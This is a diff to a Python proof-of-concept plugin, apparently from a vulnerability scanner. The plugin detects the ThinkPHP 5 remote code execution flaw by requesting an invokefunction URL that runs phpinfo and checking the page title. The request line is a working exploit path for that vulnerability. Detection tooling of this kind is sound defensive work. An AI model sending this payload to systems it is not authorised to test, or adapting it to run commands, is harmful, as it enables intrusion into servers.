@@ -3,7 +3,7 @@
 '''
 Date: 2022-03-21 16:15:34
 LastEditors: recar
-LastEditTime: 2022-03-21 18:18:56
+LastEditTime: 2022-03-23 18:15:24
 '''
 from plugins.poc.base import PocBase
 
@@ -17,15 +17,13 @@ class Poc(PocBase):
         self.desc = "ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。"
         self.fingerprint = "thinkphp"
 
-    def send_payload(self):
+    def verify(self):
         url_path = r"/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
         # 这里需要返回 response
         url = f"{self.base_url}{url_path}"
-        return self.get(url, timeout=3)
-
-    def verify(self, response):
+        response =  self.get(url, timeout=3)        
         if "<title>phpinfo()</title>" in response.text:
-            return True
-        return False
+            return True, url
+        return False, None
 
 
